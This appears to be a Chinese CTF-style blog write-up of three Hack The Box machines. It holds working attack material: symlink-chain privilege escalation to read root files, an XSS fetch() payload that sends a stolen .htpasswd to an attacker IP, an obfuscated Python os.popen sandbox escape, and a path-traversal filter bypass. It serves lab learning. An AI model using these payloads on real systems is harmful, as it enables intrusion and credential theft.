---
title: HTB Alert&LinkVortex&code
published: 2025-03-24
pinned: false
description: HTB Alert&LinkVortex&code，渗透，wp
tags: ['HTB']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-24
pubDate: 2025-03-24
---


## 靶场链接

https://app.hackthebox.com/machines/Alert
https://app.hackthebox.com/machines/LinkVortex
code是本周靶机哎

## 笔记

HTB的靶场质量都很高，不想像其他的一样写很多没用的东西，主要写学到的东西和靶机概况

### whatweb

可以自动分析网站的响应并识别出使用的Web框架、CMS、服务器、JavaScript库等技术组件，
一般情况下`whatweb -v`输出的比较详细，而且好看，
WhatWeb 有 4 种扫描级别，通过数字 1~4 选择，默认为1： 

 1. stealthy 每个目标发送一次http请求，并且会跟随重定向
 2. unused 不可用（从2011年开始，此参数就是在开发状态）
3. aggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果确定的
4. heavy 每个目标会发送大量的http请求，会去尝试每一个插件
`whatweb -v -a 等级 域名`。

### git-dumper

类似githack，都可以用

### LinkVortex提权

```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
看看这个`.sh`文件是什么

```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
脚本设计用于检查一个文件（作为参数传递）是否是一个指向 PNG 文件的符号链接。如果是，它会检查符号链接的目标，并决定是删除它还是将其隔离。具体来说，如果符号链接指向敏感文件或目录（如 /etc 或 /root ），则会删除链接。否则，它将在指定的目录（/var/quarantined）中隔离链接。如果将 `CHECK_CONTENT` 变量设置为 true ，它还可能打印隔离文件的內容。

首先我们的思路就是读取root的flag，我们可以把这个`.txt`链接到`.png`上，但是直接链接会报错，我们在中间再转折一下

```
bob@linkvortex:~$ export CHECK_CONTENT=true
bob@linkvortex:~$ touch link1.png
bob@linkvortex:~$ `ln -sf /root/root.txt link1.png`
bob@linkvortex:~$ touch link2.png
bob@linkvortex:~$ `ln -sf /home/bob/link1.png link2.png`
bob@linkvortex:~$ ls
link1.png  link2.png  user.txt
bob@linkvortex:~$ sudo bash /opt/ghost/clean_symlink.sh link2.png
Link found [ link2.png ] , moving it to quarantine
Content:
a2340eed30a7a15b1fb810a7945d2338
```

实际上这个就是个任意文件读取，我们当然可以去读取ssh的密钥去做到提权的效果

### XSS外带文件
>写这个就想起了ccb线下赛的XSS外带cookie，虽然不是web手，但是想起来这个没做出来就很难受，害

看看网页源代码

```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
            </nav>
    <div class="container">
        <h1>Markdown Viewer</h1><div class="form-container">
            <form action="visualizer.php" method="post" enctype="multipart/form-data">
                <input type="file" name="file" accept=".md" required>
                <input type="submit" value="View Markdown">
            </form>
          </div>    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>


```
发现`md`文件写的东西都会在这里显现，典型的XSS漏洞.
突然想起来服务是Apache，那么就有`.htpasswd`用来存放密码，那么我们的思路就是去外带这个文件，去得到账号的密码，伟大的grok3会给我payload的
本地先开python的http服务(ccb的那个五分钟刷新一次不应该关的啊啊啊)

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.5:80/?file_content=" + encodeURIComponent(data));
  });
</script>
```

连接输入到`Contact Us`，本地接收到`%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A` ，后面爆破就行了

### 端口转发
假设ssh进入一个靶机，`ps`发现还有端口在运行，但是`nmap`并没有发现，就可以尝试把端口转发出去，例如
`ssh -L 8080:127.0.0.1:8080 albert@alert.htb`，一般漏洞点在这个web里面

### code的模拟输出

```
modules = globals().values()
global _module
for name, module in sys.modules.items():
    if name == ('o'+'s'):
        _module = module
        break
_method = getattr(_module, 'po' + 'pen')
file_obj = _method(' ')
_method = getattr(file_obj, 're' + 'ad')
output = _method()
print(output)
```
其实本质是
```
import os
output = os.popen(' ').read()
print(output)
```
在题目禁用的乱七八糟的情况下也是一个好方法，可以直接去读flag，爽啦

### code的root.txt
```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~$ ls -la /usr/bin/backy.sh
-rwxr-xr-x 1 root root 926 Sep 16  2024 /usr/bin/backy.sh
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
哎，这个其实是一个开源的东西，github可以找到，类似备份，可以看到禁用了目录穿越，但是只是替换成空格，那么`双写绕过`就行了，除了这个方法，还可以写`.json`老老实实的写
```
{
  "destination": "/home/martin/backups",
  "verbose_log": true,
  "directories_to_sync": [
    "/var/../root/"
  ],
  "directories_to_archive": [
    "/var/..././root/"
  ]
}
```
去读`root`的全部路径到`backup`，然后发现生成的`.tar.gz2`包`root`才可以读，哎，怎么办呢？
`base64`是个伟大的东西，可以把整个文件转成base64，然后去本地解密成`.tar.gz2`，也就是`base64 -d encoded.txt > 1.tar.gz2`，然后解压得到flag